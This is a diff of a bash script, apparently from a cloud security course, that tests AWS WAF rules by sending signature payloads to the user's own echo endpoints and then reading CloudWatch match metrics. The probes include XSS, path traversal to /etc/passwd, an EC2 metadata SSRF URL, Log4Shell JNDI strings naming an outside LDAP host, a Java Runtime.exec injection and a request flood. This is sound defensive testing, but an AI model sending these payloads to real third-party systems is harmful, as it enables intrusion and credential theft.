@@ -8,13 +8,18 @@
 # echoes its input and does nothing else. There is no third-party target and
 # no vulnerability being exercised.
 #
-# Both endpoints must be your own, as emitted by `terraform output`:
 #   ./attack_simulation.sh <cloudfront_url> <api_invoke_url>
 #
-# In Count mode every request returns 200 -- that is correct and is the whole
-# point of the phase. Rule matches show up in CloudWatch metrics and the WAF
-# logs, not in the HTTP status. Re-run after flipping count_mode to false and
-# the same requests return 403.
+# IMPORTANT: in Count mode an HTTP status tells you almost nothing. Every
+# request returns 200 because nothing is being blocked -- that is the whole
+# point of the phase. Worse, some non-200 responses have nothing to do with
+# WAF at all: API Gateway returns 400 for a malformed path and 405 for an
+# unsupported method, and CloudFront returns 403 for a method outside its
+# allowed list. Reading those as "WAF blocked it" is simply wrong.
+#
+# So this script reports raw status codes without interpreting them, then
+# queries CloudWatch for what the rules ACTUALLY matched. The metrics are the
+# evidence; the status codes are just context.
 
 set -uo pipefail
 
@@ -27,35 +32,23 @@ fi
 EDGE_URL="${1%/}"
 ORIGIN_URL="${2%/}"
 
-# Rate-limit flood size. Must exceed the rate_limit Terraform variable
-# (default 100) within the evaluation window (default 60s).
-FLOOD_COUNT="${FLOOD_COUNT:-150}"
+EDGE_ACL="${EDGE_ACL:-week13-waf-edge}"
+REGIONAL_ACL="${REGIONAL_ACL:-week13-waf-regional}"
+REGION="${AWS_REGION:-us-east-1}"
 
-pass=0
-fail=0
+# Must exceed the rate_limit Terraform variable (default 100) within the
+# evaluation window (default 60s).
+FLOOD_COUNT="${FLOOD_COUNT:-150}"
 
 hr() { printf '%s\n' "------------------------------------------------------------"; }
 
-# Issue one request and report the status code against what we expected.
-# expected_enforcing is what the status should be once rules are blocking;
-# in Count mode everything legitimately returns 200.
+# Report the status code. Deliberately does NOT judge it -- see the header.
 probe() {
-  local label="$1" url="$2" expected_enforcing="$3"
-  shift 3
-
+  local label="$1" url="$2"
+  shift 2
   local status
   status=$(curl -sS -o /dev/null -w '%{http_code}' --max-time 15 "$@" "$url" 2>/dev/null)
-
-  if [[ "$status" == "$expected_enforcing" ]]; then
-    printf '  %-46s %s  (blocked as expected)\n' "$label" "$status"
-    pass=$((pass + 1))
-  elif [[ "$status" == "200" ]]; then
-    printf '  %-46s %s  (allowed -- expected in Count mode)\n' "$label" "$status"
-    pass=$((pass + 1))
-  else
-    printf '  %-46s %s  (unexpected)\n' "$label" "$status"
-    fail=$((fail + 1))
-  fi
+  printf '  %-44s -> HTTP %s\n' "$label" "$status"
 }
 
 run_suite() {
@@ -66,54 +59,85 @@ run_suite() {
   echo "        $base"
   hr
 
-  echo "[0] Baseline -- a normal request, should always be allowed"
-  probe "GET / (benign)" "$base/" "200"
+  echo "[0] Baseline -- a normal request. Must stay 200 in every mode;"
+  echo "    if this ever fails, a rule is rejecting legitimate traffic."
+  probe "GET / (benign)" "$base/"
 
   echo
   echo "[1] Core rule set -- cross-site scripting in a query string"
-  probe "XSS in query string" \
-    "$base/?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E" "403"
+  probe "XSS in query string" "$base/?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E"
 
   echo
-  echo "[2] Core rule set -- local file inclusion via path traversal"
-  probe "Path traversal in URI" \
-    "$base/..%2F..%2F..%2Fetc%2Fpasswd" "403"
-
-  echo
-  echo "[3] Core rule set -- SSRF against the EC2 instance metadata endpoint"
+  echo "[2] Core rule set -- SSRF against the EC2 metadata endpoint"
   probe "IMDS SSRF in query argument" \
-    "$base/?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F" "403"
+    "$base/?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F"
+
+  echo
+  echo "[3] Core rule set -- local file inclusion in a query argument"
+  echo "    (query arg, not URI path: a traversal sequence in the path is"
+  echo "     rejected by API Gateway with a 400 before WAF is consulted)"
+  probe "Path traversal in query argument" "$base/?file=..%2F..%2F..%2Fetc%2Fpasswd"
 
   echo
   echo "[4] Core rule set -- request with no User-Agent header"
-  probe "Missing User-Agent" "$base/" "403" -H "User-Agent;"
+  probe "Missing User-Agent" "$base/" -H "User-Agent;"
 
   echo
   echo "[5] Known bad inputs -- Log4Shell (CVE-2021-44228) in a header"
-  probe "Log4Shell JNDI in header" "$base/" "403" \
+  probe "Log4Shell JNDI in header" "$base/" \
     -H 'X-Api-Version: ${jndi:ldap://example.com/a}'
 
   echo
   echo "[6] Known bad inputs -- Java deserialization RCE in query string"
   probe "Java deserialization RCE" \
-    "$base/?p=%28java.lang.Runtime%29.getRuntime%28%29.exec%28%22whoami%22%29" "403"
+    "$base/?p=%28java.lang.Runtime%29.getRuntime%28%29.exec%28%22whoami%22%29"
 
   echo
-  echo "[7] Known bad inputs -- PROPFIND method"
-  probe "PROPFIND method" "$base/" "403" -X PROPFIND
+  echo "[7] Known bad inputs -- Log4Shell in the URI path"
+  probe "Log4Shell JNDI in URI path" "$base/%24%7Bjndi%3Aldap%3A%2F%2Fexample.com%2Fa%7D"
 
   echo
-  echo "[8] Rate-based rule -- ${FLOOD_COUNT} requests as fast as possible"
-  echo "    (rate rules evaluate about every 10 seconds, so the first"
-  echo "     requests over the limit still get through -- that is normal)"
-
-  local codes
-  codes=$(for _ in $(seq 1 "$FLOOD_COUNT"); do
+  echo "[8] Rate-based rule -- ${FLOOD_COUNT} concurrent requests"
+  echo "    (WAF re-checks the rate about every 10s, so requests sent before"
+  echo "     the next check still get through even once over the limit)"
+  for _ in $(seq 1 "$FLOOD_COUNT"); do
     curl -sS -o /dev/null -w '%{http_code}\n' --max-time 10 "$base/" 2>/dev/null &
-  done | sort | uniq -c | sort -rn)
+  done | sort | uniq -c | sed 's/^/      /'
   wait
+  echo
+}
 
-  echo "$codes" | sed 's/^/      /'
+# The actual evidence. In Count mode this is the ONLY way to know a rule fired.
+summarize() {
+  local label="$1" acl="$2" region_dim="$3"
+
+  local start end
+  start=$(date -u -d '45 min ago' +%Y-%m-%dT%H:%M:%SZ 2>/dev/null) || return 0
+  end=$(date -u +%Y-%m-%dT%H:%M:%SZ)
+
+  hr
+  echo "$label -- what the rules actually matched"
+  hr
+
+  local -a dims
+  for metric in CountedRequests BlockedRequests; do
+    for rule in "${acl}-common-rule-set" "${acl}-known-bad-inputs" \
+                "${acl}-rate-limit" "${acl}-anti-ddos" "${acl}-blocked-ip-set" ALL; do
+      dims=(Name=WebACL,Value="$acl" Name=Rule,Value="$rule")
+      # CloudFront-scope metrics carry NO Region dimension; regional ones do.
+      [[ -n "$region_dim" ]] && dims+=(Name=Region,Value="$region_dim")
+
+      local v
+      v=$(aws cloudwatch get-metric-statistics \
+            --namespace AWS/WAFV2 --metric-name "$metric" \
+            --statistics Sum --period 3600 \
+            --start-time "$start" --end-time "$end" \
+            --dimensions "${dims[@]}" --region "$REGION" \
+            --query 'Datapoints[0].Sum' --output text 2>/dev/null)
+      [[ -z "$v" || "$v" == "None" ]] && continue
+      printf '  %-16s %-46s %s\n' "$metric" "$rule" "${v%.0}"
+    done
+  done
   echo
 }
 
@@ -122,28 +146,26 @@ echo "WAF attack simulation -- Week 13"
 echo "All payloads are signature strings sent to your own echo endpoint."
 echo
 
-run_suite "CloudFront edge (CLOUDFRONT-scope web ACL + Shield Standard)" "$EDGE_URL"
-run_suite "API Gateway origin, bypassing the edge (REGIONAL-scope web ACL)" "$ORIGIN_URL"
+run_suite "CloudFront edge (CLOUDFRONT-scope ACL + Shield Standard)" "$EDGE_URL"
+run_suite "API Gateway origin, bypassing the edge (REGIONAL-scope ACL)" "$ORIGIN_URL"
 
-hr
-echo "Probes behaving as expected: $pass"
-echo "Unexpected responses:        $fail"
-hr
+echo "Waiting 90s for CloudWatch metrics to land..."
+sleep 90
+echo
+
+summarize "EDGE  ($EDGE_ACL)"     "$EDGE_ACL"     ""
+summarize "ORIGIN ($REGIONAL_ACL)" "$REGIONAL_ACL" "$REGION"
+
 cat <<'EOF'
+Reading this:
+  CountedRequests > 0  ->  the rule matched and WOULD have blocked, but did
+                           not, because count_mode is still true.
+  BlockedRequests > 0  ->  the rule matched and DID block (count_mode false).
 
-Where to look next:
+Per-request verdicts, including which rule matched:
+  MSYS_NO_PATHCONV=1 aws logs tail /aws-waf-logs-<name> --since 15m
 
-  Counted matches per rule (Count mode):
-    aws cloudwatch get-metric-statistics --namespace AWS/WAFV2 \
-      --metric-name CountedRequests --statistics Sum --period 300 \
-      --start-time "$(date -u -d '30 min ago' +%Y-%m-%dT%H:%M:%SZ)" \
-      --end-time "$(date -u +%Y-%m-%dT%H:%M:%SZ)" \
-      --dimensions Name=WebACL,Value=<web-acl-name> Name=Region,Value=<region> Name=Rule,Value=ALL
-
-  Per-request verdicts, including which rule matched:
-    MSYS_NO_PATHCONV=1 aws logs tail /aws-waf-logs-<name> --since 15m
-
-  Note: in Git Bash, prefix any aws command whose argument starts with "/"
-  with MSYS_NO_PATHCONV=1 -- otherwise the leading slash is rewritten into a
-  Windows path and the call fails with a misleading parameter error.
+In Git Bash, prefix any aws command whose argument starts with "/" with
+MSYS_NO_PATHCONV=1 -- otherwise the leading slash is rewritten into a Windows
+path and the call fails with a misleading parameter error.
 EOF
